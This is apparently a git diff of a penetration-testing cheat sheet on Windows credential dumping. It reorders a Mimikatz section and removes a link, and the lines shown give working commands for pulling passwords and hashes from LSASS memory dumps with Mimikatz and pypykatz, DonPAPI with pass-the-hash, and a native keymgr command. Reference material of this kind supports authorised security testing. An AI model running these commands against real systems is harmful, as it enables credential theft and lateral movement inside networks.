@@ -48,20 +48,7 @@ Find-DomainShare -CheckShareAccess
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
 
 ## Dump credentials
-
-### Mimikatz
-On Windows, retrieve password/hash from a dump file :
-```powershell
-sekurlsa::minidump "XXXXXXXXX.DMP"
-sekurlsa::logonPasswords
-```
-On Kali, use pypykatz based on python :
-```bash
-pypykatz lsa minidump 'XXX.DMP'
-```
-
 ### CrackMapExec
-
 Many possibilites. Use --local-auth if using a local admin account.
 With lsassy module :
 ```bash
@@ -84,17 +71,22 @@ It's possible to use the tool with Pass-The-Hash :
 ```bash
 python3 DonPAPI.py domain/user@target --hashes LM:NT
 ```
-
+### Mimikatz
+On Windows, retrieve password/hash from a dump file :
+```powershell
+sekurlsa::minidump "XXXXXXXXX.DMP"
+sekurlsa::logonPasswords
+```
+On Kali, use pypykatz based on python :
+```bash
+pypykatz lsa minidump 'XXX.DMP'
+```
 ### Others
-
 Native Windows command :
 ```powershell
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
 Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir
-
-## Dump Everything
-https://github.com/login-securite/DonPAPI
 
 ## Impersonation
 ```markdown
